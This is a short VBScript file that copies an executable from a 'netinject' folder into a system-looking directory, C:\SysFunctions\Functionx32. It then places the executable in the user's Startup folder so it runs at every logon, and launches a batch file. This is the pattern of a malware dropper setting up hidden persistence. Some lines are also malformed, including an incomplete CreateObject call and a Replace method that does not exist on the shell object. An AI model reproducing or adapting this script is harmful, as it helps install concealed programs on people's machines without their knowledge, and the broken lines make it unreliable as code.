Dim crt
Dim stpath
set txt = CreateObject(WScript.)
set crt = CreateObject("wscript.shell")
set x = CreateObject("Scripting.FileSystemObject")
set exe = CreateObject("Shell.Application")
set stpath = crt.SpecialFolders("Startup")
crt.Replace(stpath,"Startup","Startup\")
crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"
WScript.Sleep(400)
x.CopyFile "D:\netinject\App.exe", "C:\SysFunctions\Functionx32\"
x.CopyFile "D:\netinject\Appsaves.txt", "C:\SysFunctions\Functionx32\"
x.CopyFile "C:\SysFunctions\Functionx32\App.exe", stpath
WScript.Sleep(400)
exe.ShellExecute("C:\SysFunctions\Functionx32\pica.bat")